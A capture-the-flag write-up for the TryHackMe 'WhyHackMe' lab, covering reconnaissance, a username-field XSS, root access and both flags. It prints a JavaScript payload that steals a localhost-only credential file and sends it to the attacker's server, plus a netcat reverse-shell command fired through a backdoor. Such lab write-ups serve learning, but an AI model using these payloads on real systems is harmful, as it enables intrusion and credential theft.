---
title: "TryHackMe - WhyHackMe"
date: 2025-07-01 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [wireshark, xss, javascript, iptables, ftp, firewall, pcap]
--- 

"A combo of compromising and analysis for security enthusiasts."

## Reconnaissance

I began with a comprehensive port scan using **Nmap** to identify open services on the target machine. I ran the following command:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap  -T4 -sV -sC -p- 10.10.92.49 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 07:02 EDT
Nmap scan report for 10.10.92.49
Host is up (0.066s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.23.106.242
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
41312/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.25 seconds
```
Here’s what I found:

- FTP (Port 21) – vsftpd 3.0.3, allows anonymous login

- SSH (Port 22) – OpenSSH 8.2p1

- HTTP (Port 80) – Apache/2.4.41

- Unknown/Filtered port on 41312

## Accessing the FTP Server

Since the FTP server allows anonymous login, I connected:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.10.92.49
Connected to 10.10.92.49.
220 (vsFTPd 3.0.3)
Name (10.10.92.49:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12021|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
local: update.txt remote: update.txt
229 Entering Extended Passive Mode (|||8408|)
150 Opening BINARY mode data connection for update.txt (318 bytes).
100% |**********************************************************|   318        5.53 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (2.68 KiB/s)
ftp> 
```
After logging in with username `anonymous`, I found a file named `update.txt`. I downloaded it and opened it locally:

```
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```
That immediately stood out. The credentials are on `127.0.0.1`, meaning they’re only accessible from the target machine itself.

## Web Directory Enumeration

Next, I started enumerating web directories using **gobuster**:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.10.92.49 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.92.49
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 563]
/blog.php             (Status: 200) [Size: 3102]
/login.php            (Status: 200) [Size: 523]
/register.php         (Status: 200) [Size: 643]
/dir                  (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.10.92.49/assets/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
```

Interesting results:

- /register.php — allows account registration

- /blog.php — a blog with a comment section

- /dir — permission denied (403), possibly related to the internal path mentioned earlier

![1](/images/whyhackme/1.jpg)

## Exploiting XSS to Reach Localhost

I created an account and discovered I could comment on blog posts. My first XSS attempts failed in the comment body. 

![2](/images/whyhackme/2.jpg)


I used an XSS payload as the username when registering:

```
<script>alert("test2")</script>
```

![3](/images/whyhackme/3.jpg)

Once I logged in and commented, the alert fired—XSS was successful through the username field!


![4](/images/whyhackme/4.jpg)


## Exfiltrating Data with XSS

With a working XSS injection point through the username field, I decided to take the attack a step further—stealing internal-only data from the server.

The target was clear: the message in update.txt had hinted that credentials were stored at `127.0.0.1/dir/pass.txt`, accessible only from localhost. Since external users can’t reach `127.0.0.1` on the target server, I needed to trick the victim's browser into fetching this file and sending it to me.

To do this, I wrote a small JavaScript payload that sends a GET request to the localhost URL and base64-encodes the response, then forwards it to my own server.

Here’s the code I used:

```
var x=new XMLHttpRequest();
x.onreadystatechange=function(){
    if(x.readyState==4)
        fetch("http://10.23.106.242:1337/receive?data="+btoa(x.responseText))
};
x.open('GET',"http://127.0.0.1/dir/pass.txt",1);
x.send(null);
```

I hosted this JavaScript file using Python’s built-in web server. Then, I injected this payload via the username field, referencing my external script like this:

```
<script src="http://10.23.106.242:1337/xss.js"></script>
```

![5](/images/whyhackme/5.jpg)

Once the target browser processed my script, the following requests hit my server:

```
10.23.106.242 - - [05/Jul/2025 08:45:51] "GET /xss.js HTTP/1.1" 200 -
10.23.106.242 - - [05/Jul/2025 08:45:52] "GET /xss.js HTTP/1.1" 200 -
10.23.106.242 - - [05/Jul/2025 08:45:52] "GET /xss.js HTTP/1.1" 200 -
10.23.106.242 - - [05/Jul/2025 08:45:52] "GET /receive?data= HTTP/1.1" 200 -
10.10.52.132 - - [05/Jul/2025 08:46:02] "GET /xss.js HTTP/1.1" 200 -
10.10.52.132 - - [05/Jul/2025 08:46:02] "GET /receive?data=amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo= HTTP/1.1" 200 -

```

The payload `amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=` looked like our stolen credentials—base64 encoded. To decode it, I used **CyberChef**:

![6](/images/whyhackme/6.jpg)

The result: 

```
jack:WhyIsMyPasswordSoStrongIDK
```
 
## SSH Access and First Flag

With the stolen credentials in hand, I tried logging in via **SSH**.
And success! Once inside, I looked for the first flag:

```
Last login: Mon Jan 29 13:44:19 2024
jack@ubuntu:~$ ls
user.txt
jack@ubuntu:~$ cat user.txt
1ca4eb201787acbfcf9e70fca87b866a
jack@ubuntu:~$ 

```
## Exploring Privilege Escalation

Next, I checked if the `jack` user had any sudo privileges:

```
jack@ubuntu:~$ sudo -l
[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

This meant I could run `/usr/sbin/iptables` with `sudo`, which might come in handy later. At this point, though, I wasn't sure how to leverage it for privilege escalation just yet.


## Investigating /opt

While exploring the filesystem, I found an interesting folder: `/opt`. Inside were two files:

```
jack@ubuntu:/$ cd opt
jack@ubuntu:/opt$ ls
capture.pcap  urgent.txt
jack@ubuntu:/opt$ cat urgent.txt
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
jack@ubuntu:/opt$ 

```

From this message, I inferred:

- Malicious scripts were placed in `/usr/lib/cgi-bin/`.

- The attacker had a backdoor, which was temporarily blocked using iptables.

- A packet capture file (capture.pcap) might contain clues about the backdoor's operation.

## Analyzing `iptables` rules

Given that I had sudo access to `iptables`, I listed the current firewall rules:
```
sudo /usr/sbin/iptables -L --line-numbers
```
```
jack@ubuntu:/etc/apache2/certs$ sudo /usr/sbin/iptables -L --line-numbers
[sudo] password for jack: 
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere            

```

The output included this rule.This rule blocks incoming TCP traffic to port `41312`, which could be the attacker's communication channel. 

```
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
```

## Inspecting the PCAP File

I downloaded the `capture.pcap` file to my host machine for inspection. 

![7](/images/whyhackme/7.jpg)

![8](/images/whyhackme/8.jpg)

Opening it in **Wireshark**, I noticed that the traffic was encrypted using TLS — not immediately useful unless I could decrypt it.

So, I searched the system for private keys:

```
find / -name *.key 2>/dev/null
```

```
jack@ubuntu:~$ find / -name *.key 2>/dev/null
/etc/apache2/certs/apache.key
jack@ubuntu:~$ cd /etc/apache2/certs
jack@ubuntu:/etc/apache2/certs$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.23.106.242 - - [10/Jul/2025 10:00:35] "GET /apache.key HTTP/1.1" 200 -

```

Bingo. I served the file to myself via a Python HTTP server. I downloaded `apache.key` , then loaded it into Wireshark:

> Edit → Preferences → Protocols → TLS → RSA Keys → Import

![9](/images/whyhackme/9.jpg)

## Finding the Backdoor

Now **Wireshark** could decrypt the TLS traffic. Filtering for HTTP traffic  revealed suspicious requests:

![10](/images/whyhackme/10.jpg)

```
90	52.766870	10.133.71.33	10.13.64.69	HTTP	631	GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls%20-al HTTP/1.1 
69	40.807937	10.133.71.33	10.13.64.69	HTTP	631	GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1 

```

These look like encrypted parameters passed to a Python backdoor script on the target machine. Clearly, this was the backdoor mentioned in the urgent message earlier.


## Reopening the Attacker's Port

To test the backdoor, I needed to reopen port `41312`. Since I had sudo access to `iptables`, I inserted a rule to allow incoming traffic:

```
sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
```

Verifying with `iptables -L` confirmed the port was now open:

```
1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312

```

## Triggering the backdoor

From my browser, I navigated to :

```
https://10.10.147.92:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls%20-al

```

And it worked — I got a response. This confirmed the backdoor was still active.

Now it was time to get a reverse shell.

![11](/images/whyhackme/11.jpg)


## Reverse Shell Exploitation

I crafted a reverse shell payload and URL-encoded it into the cmd parameter.

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <my-ip> 8888 > /tmp/f
```

Encoded version : 

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20<my-ip>%208888%20%3E%2Ftmp%2Ff

```
Final URL :
```
https://10.10.147.92:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.23.106.242%208888%20%3E%2Ftmp%2Ff
```

Meanwhile, on my machine, I started a listener. And sure enough, I got a connection.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 8888                    
listening on [any] 8888 ...
connect to [10.23.106.242] from (UNKNOWN) [10.10.147.92] 45658
sh: 0: can't access tty; job control turned off
$ 
```
## Getting a Full Shell 

To make the shell more interactive, I upgraded it.

```
SHELL=/bin/bash script -q /dev/null
```

Now I had a fully functional shell and began exploring for privilege escalation options.

## Root Privilege Escalation and Capturing the Root Flag

I ran `sudo -l` again - this time as the `www-data` user. I could become root without needing a password. Once root, I navigated to `/root` and found the final flag:

```
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
www-data@ubuntu:/usr/lib/cgi-bin$ sudo su root
sudo su root
root@ubuntu:/usr/lib/cgi-bin# cd /root
cd /root
root@ubuntu:~# ls
ls
bot.py  root.txt  snap  ssh.sh
root@ubuntu:~# cat root.txt
cat root.txt
4dbe2259ae53846441cc2479b5475c72
root@ubuntu:~# 
```
